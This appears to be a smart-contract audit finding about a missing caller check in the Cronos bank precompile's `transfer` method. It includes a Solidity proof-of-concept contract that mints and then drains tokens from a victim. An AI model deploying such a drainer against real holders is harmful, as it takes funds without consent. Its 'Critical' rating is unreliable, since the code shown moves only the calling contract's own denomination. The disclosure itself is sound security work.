### Title
Unauthorized Transfer of Native Bank Tokens via Bank Precompile `transfer` Method — (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary

The bank precompile's `transfer` method accepts an arbitrary `sender` address from calldata and moves native bank tokens (`evm/<caller_contract>`) from that address to a recipient — without ever verifying that the EVM caller is authorized to act on behalf of the `sender`. Any contract can steal `evm/<contract>` denomination tokens from any holder.

### Finding Description

The `BankContract.Run` handler in `x/cronos/keeper/precompiles/bank.go` implements a `transfer(address sender, address recipient, uint256 amount)` method. The denom of the tokens being moved is derived from `contract.Caller()` (the calling contract's address), but the **source account** for the `SendCoins` call is taken directly from the first calldata argument (`args[0]`), with no check that `contract.Caller()` equals `sender`:

```go
case TransferMethodName:
    sender := args[0].(common.Address)          // arbitrary, from calldata
    recipient := args[1].(common.Address)
    amount := args[2].(*big.Int)
    from := sdk.AccAddress(sender.Bytes())       // victim's address
    to   := sdk.AccAddress(recipient.Bytes())
    denom := EVMDenom(contract.Caller())         // evm/<calling_contract>
    // ← NO check: contract.Caller() == sender
    err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
        return bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
    })
``` [1](#0-0) 

The bank precompile is deployed at the fixed address `0x0000000000000000000000000000000000000064` and is callable by any EVM contract. [2](#0-1) 

Compare this with the `exec` helper used by other precompiles, which explicitly enforces `caller == signer`:

```go
caller := common.BytesToAddress(signers[0])
if caller != e.caller {
    return nil, fmt.Errorf("caller is not authenticated: expected %s, got %s", ...)
}
``` [3](#0-2) 

No equivalent guard exists in the `transfer` branch of `BankContract.Run`.

### Impact Explanation

**Critical — Unauthorized transfer of precompile-controlled assets.**

A malicious contract can call `bankPrecompile.transfer(victim, attacker, amount)` and the bank module will execute `SendCoins(victim → attacker)` for the denom `evm/<malicious_contract>`. The victim's balance is debited and the attacker's balance is credited with no authorization from the victim. This is a direct, unconditional theft of native bank tokens.

### Likelihood Explanation

Any unprivileged EVM account can deploy a contract and call the bank precompile. The only precondition is that the victim holds `evm/<attacker_contract>` tokens. This is realistic in any DeFi scenario where the attacker's contract first mints tokens to users (e.g., as LP shares, reward tokens, or receipt tokens) and later drains them. The `mint` method on the same precompile has no caller restriction either, making the full attack self-contained. [4](#0-3) 

### Recommendation

Add a caller-authorization check in the `transfer` case, mirroring the pattern used in `exec`:

```go
case TransferMethodName:
    sender := args[0].(common.Address)
    if contract.Caller() != sender {
        return nil, errors.New("transfer: caller is not the sender")
    }
    // ... rest of logic
```

Alternatively, remove the `sender` argument entirely and derive it from `contract.Caller()`, consistent with how ERC-20 `transfer` works.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
}

contract BankDrainer {
    IBankPrecompile constant bank = IBankPrecompile(0x0000000000000000000000000000000000000064);

    // Step 1: mint evm/<this> tokens to victim (e.g., as "rewards")
    function seedVictim(address victim, uint256 amount) external {
        // calls bank.mint(victim, amount) — denom = evm/<this>
        (bool ok,) = address(bank).call(
            abi.encodeWithSignature("mint(address,uint256)", victim, amount)
        );
        require(ok);
    }

    // Step 2: steal them back — no victim signature required
    function drain(address victim, address attacker, uint256 amount) external {
        bool ok = bank.transfer(victim, attacker, amount);
        require(ok, "drain failed");
    }
}
```

1. Deploy `BankDrainer` at address `C`.
2. Call `seedVictim(victim, 1000)` — victim now holds 1000 `evm/C` tokens.
3. Call `drain(victim, attacker, 1000)` — the bank precompile executes `SendCoins(victim → attacker, 1000 evm/C)` with no authorization from victim.
4. Victim's balance is zero; attacker holds 1000 `evm/C` tokens. [1](#0-0)
